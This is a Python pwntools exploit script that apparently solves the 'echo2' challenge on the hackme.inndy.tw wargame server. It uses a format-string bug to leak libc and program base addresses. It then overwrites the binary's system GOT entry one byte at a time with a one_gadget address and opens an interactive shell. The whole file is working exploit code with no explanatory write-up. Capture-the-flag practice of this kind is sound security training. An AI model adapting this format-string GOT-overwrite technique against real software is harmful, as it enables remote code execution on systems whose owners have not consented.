#!/usr/bin/env python3
from pwn import *

# Idea: Replace systet got with one_gadget

#r = process('./echo2')
#elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
r = remote('hackme.inndy.tw', 7712)
elf = ELF('./libc-2.23.so.x86_64')
binary = ELF('./echo2')

# Get libc base
r.sendline(b'%43$lp')
libc_start_main = int(r.recvline().split()[0].decode(), 16) - 231
libc_base = libc_start_main - elf.symbols[b'__libc_start_main']
print("[+] __libc_start_main: {}".format(hex(libc_start_main)))

# Get process base address
r.sendline(b'%41$lp')
base = int(r.recvline().split()[0].decode(), 16) - 0xa03
print("[+] Base: {}".format(hex(base)))

#gadget_off = 0x10a38c # Gadget offest of my libc (found by one_gadget)
gadget_off = 0x45206   # Gadget offset of the given libc
one_gadget = libc_base+gadget_off
print('[+] One gadget: {}'.format(hex(one_gadget)))

system = base + binary.got[b'system']
print('[+] system: {}'.format(hex(system)))
#gdb.attach(r)

# Since 64-bit address contains '\x00' at the end of string, so we need to put the address
# at the end of payload, or else it would be truncated
for i in range(8):
    target = one_gadget & 0xff
    one_gadget >>= 8
    if target == 0:
        target = 0x100

    payload = '%{}c%9$hhn-------------'.format(str(target).zfill(3)).encode()
    payload += p64(system+i)
    r.sendline(payload)

r.interactive()


